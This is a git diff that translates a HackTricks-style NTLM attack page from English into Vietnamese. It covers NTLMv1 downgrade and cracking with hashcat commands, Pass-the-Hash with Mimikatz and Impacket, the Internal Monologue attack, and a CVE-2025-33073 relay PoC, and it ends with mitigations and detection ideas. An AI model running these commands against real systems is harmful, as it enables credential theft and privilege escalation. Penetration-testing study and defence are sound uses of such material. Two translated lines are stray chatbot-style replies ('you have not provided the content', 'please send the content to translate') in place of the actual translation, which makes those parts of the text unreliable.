@@ -3,42 +3,42 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 
-## Basic Information
+## Thông tin cơ bản
 
-In environments where **Windows XP and Server 2003** are in operation, LM (Lan Manager) hashes are utilized, although it's widely recognized that these can be easily compromised. A particular LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, indicates a scenario where LM is not employed, representing the hash for an empty string.
+Trong các môi trường đang vận hành **Windows XP và Server 2003**, hash LM (Lan Manager) được sử dụng, mặc dù chúng được biết đến rộng rãi là có thể bị xâm phạm dễ dàng. Một hash LM cụ thể, `AAD3B435B51404EEAAD3B435B51404EE`, cho biết LM không được sử dụng; đây là hash của chuỗi rỗng.
 
-By default, the **Kerberos** authentication protocol is the primary method used. NTLM (NT LAN Manager) steps in under specific circumstances: absence of Active Directory, non-existence of the domain, malfunctioning of Kerberos due to improper configuration, or when connections are attempted using an IP address rather than a valid hostname.
+Theo mặc định, giao thức xác thực **Kerberos** là phương thức chính được sử dụng. NTLM (NT LAN Manager) được dùng trong một số trường hợp cụ thể: không có Active Directory, domain không tồn tại, Kerberos gặp trục trặc do cấu hình không đúng, hoặc khi kết nối bằng địa chỉ IP thay vì hostname hợp lệ.
 
-The presence of the **"NTLMSSP"** header in network packets signals an NTLM authentication process.
+Sự hiện diện của header **"NTLMSSP"** trong các gói mạng cho biết đang diễn ra quá trình xác thực NTLM.
 
-Support for the authentication protocols - LM, NTLMv1, and NTLMv2 - is facilitated by a specific DLL located at `%windir%\Windows\System32\msv1\_0.dll`.
+Các giao thức xác thực LM, NTLMv1 và NTLMv2 được hỗ trợ bởi một DLL cụ thể nằm tại `%windir%\Windows\System32\msv1\_0.dll`.
 
-**Key Points**:
+**Các điểm chính**:
 
-- LM hashes are vulnerable and an empty LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) signifies its non-use.
-- Kerberos is the default authentication method, with NTLM used only under certain conditions.
-- NTLM authentication packets are identifiable by the "NTLMSSP" header.
-- LM, NTLMv1, and NTLMv2 protocols are supported by the system file `msv1\_0.dll`.
+- Hash LM dễ bị tấn công; hash LM rỗng (`AAD3B435B51404EEAAD3B435B51404EE`) cho biết LM không được sử dụng.
+- Kerberos là phương thức xác thực mặc định; NTLM chỉ được dùng trong một số điều kiện nhất định.
+- Có thể nhận diện các gói xác thực NTLM qua header "NTLMSSP".
+- Các giao thức LM, NTLMv1 và NTLMv2 được hỗ trợ bởi tệp hệ thống `msv1\_0.dll`.
 
-## LM, NTLMv1 and NTLMv2
+## LM, NTLMv1 và NTLMv2
 
-You can check and configure which protocol will be used:
+Bạn có thể kiểm tra và cấu hình giao thức sẽ được sử dụng:
 
 ### GUI
 
-Execute _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. There are 6 levels (from 0 to 5).
+Chạy _secpol.msc_ -> Chính sách cục bộ -> Tùy chọn bảo mật -> Bảo mật mạng: Mức xác thực LAN Manager. Có 6 mức (từ 0 đến 5).
 
-![LM, NTLMv1 and NTLMv2 - GUI: Execute secpol.msc - Local policies - Security Options - Network Security: LAN Manager authentication level. There are 6 levels (from 0 to 5)](<../../images/image (919).png>)
+![LM, NTLMv1 và NTLMv2 - GUI: Chạy secpol.msc - Chính sách cục bộ - Tùy chọn bảo mật - Bảo mật mạng: Mức xác thực LAN Manager. Có 6 mức (từ 0 đến 5)](<../../images/image (919).png>)
 
 ### Registry
 
-This will set the level 5:
+Thao tác này sẽ đặt mức 5:
 
 ```
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
 ```
 
-Possible values:
+Các giá trị có thể có:
 
 ```
 0 - Send LM & NTLM responses
@@ -49,56 +49,56 @@ Possible values:
 5 - Send NTLMv2 response only, refuse LM & NTLM
 ```
 
-## Basic NTLM Domain authentication Scheme
+## Lược đồ xác thực NTLM Domain cơ bản
 
-1. The **user** introduces his **credentials**
-2. The client machine **sends an authentication request** sending the **domain name** and the **username**
-3. The **server** sends the **challenge**
-4. The **client encrypts** the **challenge** using the hash of the password as key and sends it as response
-5. The **server sends** to the **Domain controller** the **domain name, the username, the challenge and the response**. If there **isn't** an Active Directory configured or the domain name is the name of the server, the credentials are **checked locally**.
-6. The **domain controller checks if everything is correct** and sends the information to the server
+1. **Người dùng** nhập **thông tin xác thực**
+2. Máy client **gửi yêu cầu xác thực**, bao gồm **tên domain** và **tên người dùng**
+3. **Server** gửi **challenge**
+4. **Client mã hóa** **challenge** bằng hash của mật khẩu làm khóa rồi gửi lại dưới dạng response
+5. **Server gửi** cho **Domain Controller** **tên domain, tên người dùng, challenge và response**. Nếu **không có** Active Directory được cấu hình hoặc tên domain trùng với tên server, thông tin xác thực sẽ được **kiểm tra cục bộ**.
+6. **Domain Controller kiểm tra xem mọi thứ có chính xác không** rồi gửi thông tin cho server
 
-The **server** and the **Domain Controller** are able to create a **Secure Channel** via **Netlogon** server as the Domain Controller know the password of the server (it is inside the **NTDS.DIT** db).
+**Server** và **Domain Controller** có thể tạo **Secure Channel** thông qua server **Netlogon**, vì Domain Controller biết mật khẩu của server (mật khẩu này nằm trong db **NTDS.DIT**).
 
-### Local NTLM authentication Scheme
+### Lược đồ xác thực NTLM cục bộ
 
-The authentication is as the one mentioned **before but** the **server** knows the **hash of the user** that tries to authenticate inside the **SAM** file. So, instead of asking the Domain Controller, the **server will check itself** if the user can authenticate.
+Quá trình xác thực giống như đã nêu **ở trên, nhưng** **server** biết **hash của người dùng** đang cố xác thực, được lưu trong tệp **SAM**. Vì vậy, thay vì hỏi Domain Controller, **server sẽ tự kiểm tra** xem người dùng có thể xác thực hay không.
 
 ### NTLMv1 Challenge
 
-The **challenge length is 8 bytes** and the **response is 24 bytes** long.
+**Độ dài challenge là 8 byte** và **response dài 24 byte**.
 
-The **hash NT (16bytes)** is divided in **3 parts of 7bytes each** (7B + 7B + (2B+0x00\*5)): the **last part is filled with zeros**. Then, the **challenge** is **ciphered separately** with each part and the **resulting** ciphered bytes are **joined**. Total: 8B + 8B + 8B = 24Bytes.
+**Hash NT (16 byte)** được chia thành **3 phần, mỗi phần 7 byte** (7B + 7B + (2B+0x00\*5)): **phần cuối được điền bằng các số 0**. Sau đó, **challenge** được **mã hóa riêng** bằng từng phần và các byte đã mã hóa **được nối lại**. Tổng cộng: 8B + 8B + 8B = 24 byte.
 
-**Problems**:
+**Vấn đề**:
 
-- Lack of **randomness**
-- The 3 parts can be **attacked separately** to find the NT hash
-- **DES is crackable**
-- The 3º key is composed always by **5 zeros**.
-- Given the **same challenge** the **response** will be **same**. So, you can give as a **challenge** to the victim the string "**1122334455667788**" and attack the response used **precomputed rainbow tables**.
+- Thiếu **tính ngẫu nhiên**
+- Có thể **tấn công riêng từng phần** để tìm NT hash
+- **DES có thể bị crack**
+- Khóa thứ **3** luôn được cấu thành từ **5 số 0**.
+- Với **cùng một challenge**, **response** sẽ **giống nhau**. Vì vậy, bạn có thể gửi cho nạn nhân chuỗi "**1122334455667788**" làm **challenge** rồi tấn công response bằng cách sử dụng **rainbow table được tính toán trước**.
 
-### NTLMv1 attack
+### Tấn công NTLMv1
 
-Unconstrained delegation is less common in modern environments, but a reachable **Print Spooler service** may still be abused to coerce authentication to such a host.
+Unconstrained delegation ít phổ biến hơn trong các môi trường hiện đại, nhưng vẫn có thể lạm dụng một dịch vụ **Print Spooler** có thể truy cập để buộc xác thực đến một host như vậy.
 
-You could abuse some credentials/sessions you already have on the AD to **ask the printer to authenticate** against some **host under your control**. Then, using `metasploit auxiliary/server/capture/smb` or `responder` you can **set the authentication challenge to 1122334455667788**, capture the authentication attempt, and if it was done using **NTLMv1** you will be able to **crack it**.\
-If you are using `responder` you could try to **use the flag `--lm`** to try to **downgrade** the **authentication**.\
-_Note that for this technique the authentication must be performed using NTLMv1 (NTLMv2 is not valid)._
+Bạn có thể lạm dụng một số thông tin xác thực/phiên mà bạn đã có trên AD để **yêu cầu máy in xác thực** với một **host do bạn kiểm soát**. Sau đó, dùng `metasploit auxiliary/server/capture/smb` hoặc `responder`, bạn có thể **đặt challenge xác thực thành 1122334455667788**, bắt lại lần xác thực và nếu nó được thực hiện bằng **NTLMv1**, bạn sẽ có thể **crack nó**.\
+Nếu dùng `responder`, bạn có thể thử **dùng flag `--lm`** để thử **hạ cấp** **quá trình xác thực**.\
+_Lưu ý rằng kỹ thuật này yêu cầu quá trình xác thực phải dùng NTLMv1 (NTLMv2 không hợp lệ)._
 
-Remember that the printer will use the computer account during the authentication, and computer accounts use **long and random passwords** that you **probably won't be able to crack** using common **dictionaries**. But the **NTLMv1** authentication **uses DES** ([more info here](#ntlmv1-challenge)), so using some services specially dedicated to cracking DES you will be able to crack it (you could use [https://crack.sh/](https://crack.sh) or [https://ntlmv1.com/](https://ntlmv1.com) for example).
+Hãy nhớ rằng máy in sẽ dùng tài khoản máy tính trong quá trình xác thực, còn tài khoản máy tính sử dụng **mật khẩu dài và ngẫu nhiên** mà bạn **có thể sẽ không crack được** bằng các **từ điển** thông thường. Tuy nhiên, quá trình xác thực **NTLMv1** **dùng DES** ([xem thêm thông tin tại đây](#ntlmv1-challenge)), vì vậy bạn có thể crack nó bằng một số dịch vụ chuyên dụng để crack DES (ví dụ: [https://crack.sh/](https://crack.sh) hoặc [https://ntlmv1.com/](https://ntlmv1.com)).
 
-### NTLMv1 attack with hashcat
+### Tấn công NTLMv1 bằng hashcat
 
-NTLMv1 can also be attacked with [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi), which converts captured NTLMv1 messages into formats suitable for Hashcat.<sup>[[1]](#references)</sup>
+NTLMv1 cũng có thể bị tấn công bằng [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi), công cụ chuyển các thông điệp NTLMv1 đã bắt được sang những định dạng phù hợp với Hashcat.<sup>[[1]](#references)</sup>
 
-The command
+Lệnh
 
 ```bash
 python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
 ```
 
-would output the below:
+sẽ xuất ra nội dung bên dưới:
 
 ```bash
 ['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']
@@ -126,20 +126,20 @@ To Crack with crack.sh use the following token
 NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
 ```
 
-Create a file with the contents of:
+Bạn chưa cung cấp nội dung cần đưa vào tệp.
 
 ```bash
 727B4E35F947129E:1122334455667788
 A52B9CDEDAE86934:1122334455667788
 ```
 
-Run hashcat (distributed is best through a tool such as hashtopolis) as this will take several days otherwise.
+Chạy hashcat (tốt nhất là chạy phân tán thông qua một công cụ như hashtopolis), vì nếu không việc này sẽ mất vài ngày.
 
 ```bash
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
 
-In this case we know the password to this is password so we are going to cheat for demo purposes:
+Trong trường hợp này, chúng ta biết mật khẩu của nó là password, nên sẽ gian lận để minh họa:
 
 ```bash
 python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
@@ -150,7 +150,7 @@ echo b55d6d04e67926>>des.cand
 echo bcba83e6895b9d>>des.cand
 ```
 
-We now need to use the hashcat-utilities to convert the cracked des keys into parts of the NTLM hash:
+Bây giờ chúng ta cần sử dụng hashcat-utilities để chuyển đổi các khóa DES đã crack thành các phần của hash NTLM:
 
 ```bash
 ./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
@@ -160,7 +160,7 @@ b4b9b02e6f09a9 # this is part 1
 bd760f388b6700 # this is part 2
 ```
 
-Ginally the last part:
+Vui lòng gửi phần nội dung cần dịch.
 
 ```bash
 ./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788
@@ -168,56 +168,56 @@ Ginally the last part:
 586c # this is the last part
 ```
 
-Combine them together:
+Kết hợp chúng lại với nhau:
 
 ```bash
 NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ```
 
-### NTLMv2 Challenge
+### Thử thách NTLMv2
 
-The **challenge length is 8 bytes** and **2 responses are sent**: One is **24 bytes** long and the length of the **other** is **variable**.
+**Độ dài challenge là 8 byte** và **có 2 response được gửi**: Một response dài **24 byte** và response **còn lại** có độ dài **thay đổi**.
 
-**The first response** is created by ciphering using **HMAC_MD5** the **string** composed by the **client and the domain** and using as **key** the **hash MD4** of the **NT hash**. Then, the **result** will by used as **key** to cipher using **HMAC_MD5** the **challenge**. To this, **a client challenge of 8 bytes will be added**. Total: 24 B.
+**Response đầu tiên** được tạo bằng cách mã hóa **chuỗi** gồm **client và domain** bằng **HMAC_MD5**, sử dụng **hash MD4** của **NT hash** làm **key**. Sau đó, **kết quả** được dùng làm **key** để mã hóa **challenge** bằng **HMAC_MD5**. Tiếp theo, **client challenge dài 8 byte** được thêm vào. Tổng cộng: 24 B.
 
-The **second response** is created using **several values** (a new client challenge, a **timestamp** to avoid **replay attacks**...)
+**Response thứ hai** được tạo bằng cách sử dụng **nhiều giá trị** (một client challenge mới, **timestamp** để tránh **replay attack**...)
 
-If you have a **PCAP containing a successful authentication exchange**, extract the domain, username, server challenge, and NTLMv2 response, format the capture for Hashcat, and use mode `5600` to attempt password recovery. The archived practical walkthrough retains the packet-field extraction procedure, while Hashcat's examples define the current accepted format.<sup>[[2]](#references)[[7]](#references)</sup>
+Nếu bạn có **PCAP chứa một phiên trao đổi xác thực thành công**, hãy trích xuất domain, username, server challenge và NTLMv2 response, định dạng capture cho Hashcat, rồi dùng mode `5600` để thử khôi phục mật khẩu. Bài hướng dẫn thực hành được lưu trữ vẫn giữ nguyên quy trình trích xuất các trường trong packet, còn các ví dụ của Hashcat xác định định dạng hiện được chấp nhận.<sup>[[2]](#references)[[7]](#references)</sup>
 
 ## Pass-the-Hash
 
-**Once you have the hash of the victim**, you can use it to **impersonate** it.\
-You need to use a **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.
+**Khi đã có hash của nạn nhân**, bạn có thể dùng nó để **mạo danh** nạn nhân.\
+Bạn cần dùng một **tool** để **thực hiện** **xác thực NTLM bằng** **hash** đó, **hoặc** bạn có thể tạo một **sessionlogon** mới và **inject** **hash** đó vào **LSASS**, để bất cứ khi nào **xác thực NTLM được thực hiện**, **hash đó sẽ được sử dụng.** Đây là cách mà mimikatz thực hiện.
 
-**Please, remember that you can perform Pass-the-Hash attacks also using Computer accounts.**
+**Xin lưu ý, bạn cũng có thể thực hiện các cuộc tấn công Pass-the-Hash bằng tài khoản Computer.**
 
 ### **Mimikatz**
 
-**Needs to be run as administrator**
+**Cần chạy với quyền administrator**
 
 ```bash
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
 ```
 
-This launches a process under the current local user, while LSASS associates the supplied credentials with its outbound network logon. You can then access network resources as the supplied user, similarly to `runas /netonly`, without knowing the plaintext password.
+Thao tác này khởi chạy một tiến trình dưới tài khoản người dùng cục bộ hiện tại, trong khi LSASS liên kết thông tin xác thực được cung cấp với phiên đăng nhập mạng đi ra của nó. Sau đó, bạn có thể truy cập tài nguyên mạng bằng tài khoản người dùng được cung cấp, tương tự như `runas /netonly`, mà không cần biết mật khẩu dạng plaintext.
 
-### Pass-the-Hash from linux
+### Pass-the-Hash từ Linux
 
-You can obtain code execution in Windows machines using Pass-the-Hash from Linux.\
-[**See practical Pass-the-Hash execution examples with Impacket PsExec.**](../lateral-movement/psexec-and-winexec.md#impacket-psexecpy-psexec-like)
+Bạn có thể thực thi mã trên các máy Windows bằng Pass-the-Hash từ Linux.\
+[**Xem các ví dụ thực hành thực thi Pass-the-Hash bằng Impacket PsExec.**](../lateral-movement/psexec-and-winexec.md#impacket-psexecpy-psexec-like)
 
-### Impacket Windows compiled tools
+### Các công cụ Impacket đã biên dịch cho Windows
 
-You can download[ impacket binaries for Windows here](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).
+Bạn có thể tải xuống[ các binary Impacket cho Windows tại đây](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).
 
 - **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
 - **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
-- **atexec.exe** (In this case you need to specify a command, cmd.exe and powershell.exe are not valid to obtain an interactive shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
-- There are several more Impacket binaries...
+- **atexec.exe** (Trong trường hợp này, bạn cần chỉ định một lệnh; cmd.exe và powershell.exe không hợp lệ để lấy shell tương tác)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
+- Còn nhiều binary Impacket khác...
 
 ### Invoke-TheHash
 
-You can get the powershell scripts from here: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>
+Bạn có thể lấy các script powershell tại đây: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>
 
 #### Invoke-SMBExec
 
@@ -245,7 +245,7 @@ Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff
 
 #### Invoke-TheHash
 
-This function combines the preceding modes. You can pass **several hosts**, exclude selected targets, and choose _SMBExec, WMIExec, SMBClient,_ or _SMBEnum_. If you select **SMBExec** or **WMIExec** without a _**Command**_ parameter, it only checks whether you have sufficient permissions.
+Hàm này kết hợp các chế độ trước đó. Bạn có thể truyền **nhiều máy chủ**, loại trừ các mục tiêu đã chọn và chọn _SMBExec, WMIExec, SMBClient,_ hoặc _SMBEnum_. Nếu chọn **SMBExec** hoặc **WMIExec** mà không có tham số _**Command**_, hàm chỉ kiểm tra xem bạn có đủ quyền hay không.
 
 ```
 Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
@@ -255,66 +255,66 @@ Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100
 
 ### Windows Credentials Editor (WCE)
 
-**Needs to be run as administrator**
+**Cần chạy với quyền quản trị viên**
 
-This tool will do the same thing as mimikatz (modify LSASS memory).
+Công cụ này thực hiện tương tự mimikatz (chỉnh sửa bộ nhớ LSASS).
 
 ```
 wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 ```
 
-### Manual Windows remote execution with username and password
+### Thực thi từ xa Windows thủ công bằng tên người dùng và mật khẩu
 
 
 {{#ref}}
 ../lateral-movement/
 {{#endref}}
 
-## Extracting credentials from a Windows Host
+## Trích xuất thông tin xác thực từ máy chủ Windows
 
-For more information, see [**Stealing Windows Credentials**](../stealing-credentials/README.md).
+Để biết thêm thông tin, xem [**Đánh cắp thông tin xác thực Windows**](../stealing-credentials/README.md).
 
-## Internal Monologue attack
+## Tấn công Internal Monologue
 
-The Internal Monologue Attack is a stealthy credential extraction technique that allows an attacker to retrieve NTLM hashes from a victim's machine **without interacting directly with the LSASS process**. Unlike Mimikatz, which reads hashes directly from memory and is frequently blocked by endpoint security solutions or Credential Guard, this attack leverages **local calls to the NTLM authentication package (MSV1_0) via the Security Support Provider Interface (SSPI)**. The attacker first **downgrades NTLM settings** (e.g., LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) to ensure that NetNTLMv1 is permitted. They then impersonate existing user tokens obtained from running processes and trigger NTLM authentication locally to generate NetNTLMv1 responses using a known challenge.<sup>[[4]](#references)</sup>
+Internal Monologue Attack là kỹ thuật trích xuất thông tin xác thực bí mật, cho phép kẻ tấn công lấy NTLM hash từ máy của nạn nhân **mà không tương tác trực tiếp với tiến trình LSASS**. Khác với Mimikatz, vốn đọc hash trực tiếp từ bộ nhớ và thường bị các giải pháp bảo mật đầu cuối hoặc Credential Guard chặn, cuộc tấn công này tận dụng **các lệnh gọi cục bộ đến gói xác thực NTLM (MSV1_0) thông qua Security Support Provider Interface (SSPI)**. Trước tiên, kẻ tấn công **hạ cấp các thiết lập NTLM** (ví dụ: LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) để cho phép NetNTLMv1. Sau đó, chúng mạo danh các token người dùng hiện có lấy được từ những tiến trình đang chạy và kích hoạt xác thực NTLM cục bộ để tạo phản hồi NetNTLMv1 bằng một challenge đã biết.<sup>[[4]](#references)</sup>
 
-After capturing these NetNTLMv1 responses, the attacker can quickly recover the original NTLM hashes using **precomputed rainbow tables**, enabling further Pass-the-Hash attacks for lateral movement. Crucially, the Internal Monologue Attack remains stealthy because it doesn't generate network traffic, inject code, or trigger direct memory dumps, making it harder for defenders to detect compared to traditional methods like Mimikatz.
+Sau khi thu thập các phản hồi NetNTLMv1 này, kẻ tấn công có thể nhanh chóng khôi phục NTLM hash gốc bằng **rainbow table được tính toán trước**, từ đó thực hiện các cuộc tấn công Pass-the-Hash để di chuyển ngang. Điểm quan trọng là Internal Monologue Attack vẫn khó bị phát hiện vì không tạo lưu lượng mạng, chèn code hay kích hoạt việc dump bộ nhớ trực tiếp, khiến các biện pháp phòng thủ khó phát hiện hơn so với những phương pháp truyền thống như Mimikatz.
 
-If NetNTLMv1 is not accepted—due to enforced security policies, then the attacker may fail to retrieve a NetNTLMv1 response.
+Nếu NetNTLMv1 không được chấp nhận do các chính sách bảo mật bắt buộc, kẻ tấn công có thể không lấy được phản hồi NetNTLMv1.
 
-To handle this case, the Internal Monologue tool was updated: It dynamically acquires a server token using `AcceptSecurityContext()` to still **capture NetNTLMv2 responses** if NetNTLMv1 fails. While NetNTLMv2 is much harder to crack, it still opens a path for relay attacks or offline brute-force in limited cases.
+Để xử lý trường hợp này, công cụ Internal Monologue đã được cập nhật: Công cụ tự động lấy token máy chủ bằng `AcceptSecurityContext()` để vẫn **thu thập phản hồi NetNTLMv2** nếu NetNTLMv1 không thành công. Dù NetNTLMv2 khó crack hơn nhiều, nó vẫn mở ra khả năng thực hiện các cuộc tấn công relay hoặc brute-force offline trong một số trường hợp hạn chế.
 
-The PoC can be found in **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>
+Có thể tìm thấy PoC tại **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>
 
-## NTLM Relay and Responder
+## NTLM Relay và Responder
 
-**Read more detailed guide on how to perform those attacks here:**
+**Đọc hướng dẫn chi tiết hơn về cách thực hiện các cuộc tấn công này tại đây:**
 
 
 {{#ref}}
 ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
 {{#endref}}
 
-## Parse NTLM challenges from a network capture
+## Phân tích NTLM challenge từ bản capture mạng
 
-**You can use** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
+**Bạn có thể dùng** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
 
-## NTLM & Kerberos *Reflection* via Serialized SPNs (CVE-2025-33073)
+## NTLM & Kerberos *Reflection* qua SPN được tuần tự hóa (CVE-2025-33073)
 
-Windows contains several mitigations that try to prevent *reflection* attacks where an NTLM (or Kerberos) authentication that originates from a host is relayed back to the **same** host to gain SYSTEM privileges.  
+Windows có một số biện pháp giảm thiểu nhằm ngăn chặn các cuộc tấn công *reflection*, trong đó một xác thực NTLM (hoặc Kerberos) bắt nguồn từ máy chủ bị chuyển tiếp trở lại **chính** máy chủ đó để giành quyền SYSTEM.
 
-Microsoft broke most public chains with MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) and later patches, however **CVE-2025-33073** shows that the protections can still be bypassed by abusing how the **SMB client truncates Service Principal Names (SPNs)** that contain *marshalled* (serialized) target-info.<sup>[[5]](#references)[[6]](#references)</sup>
+Microsoft đã vô hiệu hóa hầu hết các chuỗi khai thác công khai bằng MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) và các bản vá về sau. Tuy nhiên, **CVE-2025-33073** cho thấy vẫn có thể vượt qua các biện pháp bảo vệ bằng cách khai thác cách **SMB client cắt ngắn Service Principal Name (SPN)** có chứa thông tin target-info được *marshal* (tuần tự hóa).<sup>[[5]](#references)[[6]](#references)</sup>
 
-### TL;DR of the bug
-1. An attacker registers a **DNS A-record** whose label encodes a marshalled SPN – e.g.
+### Tóm tắt nhanh về lỗi
+1. Kẻ tấn công đăng ký một **DNS A-record** có nhãn mã hóa SPN được marshal – ví dụ:
    `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
-2. The victim is coerced to authenticate to that hostname (PetitPotam, DFSCoerce, etc.).
-3. When the SMB client passes the target string `cifs/srv11UWhRCAAAAA…` to `lsasrv!LsapCheckMarshalledTargetInfo`, the call to `CredUnmarshalTargetInfo` **strips** the serialized blob, leaving **`cifs/srv1`**.
-4. `msv1_0!SspIsTargetLocalhost` (or the Kerberos equivalent) now considers the target to be *localhost* because the short host part matches the computer name (`SRV1`).
-5. Consequently, the server sets `NTLMSSP_NEGOTIATE_LOCAL_CALL` and injects **LSASS’ SYSTEM access-token** into the context (for Kerberos a SYSTEM-marked subsession key is created).
-6. Relaying that authentication with `ntlmrelayx.py` **or** `krbrelayx.py` gives full SYSTEM rights on the same host.<sup>[[5]](#references)</sup>
+2. Nạn nhân bị buộc phải xác thực với hostname đó (PetitPotam, DFSCoerce, v.v.).
+3. Khi SMB client truyền chuỗi đích `cifs/srv11UWhRCAAAAA…` đến `lsasrv!LsapCheckMarshalledTargetInfo`, lệnh gọi `CredUnmarshalTargetInfo` **loại bỏ** blob đã tuần tự hóa, chỉ còn lại **`cifs/srv1`**.
+4. `msv1_0!SspIsTargetLocalhost` (hoặc thành phần tương đương của Kerberos) lúc này xem đích là *localhost* vì phần hostname rút gọn khớp với tên máy tính (`SRV1`).
+5. Do đó, máy chủ đặt `NTLMSSP_NEGOTIATE_LOCAL_CALL` và chèn **access token SYSTEM của LSASS** vào context (với Kerberos, một khóa subsession được đánh dấu SYSTEM sẽ được tạo).
+6. Chuyển tiếp xác thực này bằng `ntlmrelayx.py` **hoặc** `krbrelayx.py` sẽ cấp đầy đủ quyền SYSTEM trên chính máy chủ đó.<sup>[[5]](#references)</sup>
 
-### Quick PoC
+### PoC nhanh
 ```bash
 # Add malicious DNS record
 dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
@@ -332,31 +332,30 @@ ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
 krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
 ```
 
-### Patch & Mitigations
-* KB patch for **CVE-2025-33073** adds a check in `mrxsmb.sys::SmbCeCreateSrvCall` that blocks any SMB connection whose target contains marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
-* Enforce **SMB signing** on SMB relay destinations. For other destinations, assess that protocol's own signing or Extended Protection requirements and patch level; SMB signing alone does not determine whether an HTTPS WinRM relay is possible.
-* Monitor DNS records resembling `*<base64>...*` and block coercion vectors (PetitPotam, DFSCoerce, AuthIP...).
+### Bản vá & Biện pháp giảm thiểu
+* Bản vá KB cho **CVE-2025-33073** bổ sung bước kiểm tra trong `mrxsmb.sys::SmbCeCreateSrvCall`, chặn mọi kết nối SMB có đích chứa thông tin được marshal (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
+* Bắt buộc **SMB signing** trên các đích SMB relay. Với các đích khác, hãy đánh giá yêu cầu signing hoặc Extended Protection riêng của giao thức đó và mức bản vá; chỉ SMB signing không quyết định được liệu có thể relay HTTPS WinRM hay không.
+* Giám sát các bản ghi DNS có dạng `*<base64>...*` và chặn các vector ép xác thực (PetitPotam, DFSCoerce, AuthIP...).
 
-### Detection ideas
-* Network captures with `NTLMSSP_NEGOTIATE_LOCAL_CALL` where client IP ≠ server IP.
-* Kerberos AP-REQ containing a subsession key and a client principal equal to the hostname.
-* Windows Event 4624/4648 SYSTEM logons immediately followed by remote SMB writes from the same host.<sup>[[5]](#references)</sup>
+### Ý tưởng phát hiện
+* Bản ghi bắt gói mạng có `NTLMSSP_NEGOTIATE_LOCAL_CALL` khi IP máy khách ≠ IP máy chủ.
+* Kerberos AP-REQ chứa khóa subsession và principal của máy khách trùng với hostname.
+* Các sự kiện đăng nhập SYSTEM Windows 4624/4648 ngay sau đó là các lần ghi SMB từ xa từ cùng một máy chủ.<sup>[[5]](#references)</sup>
 
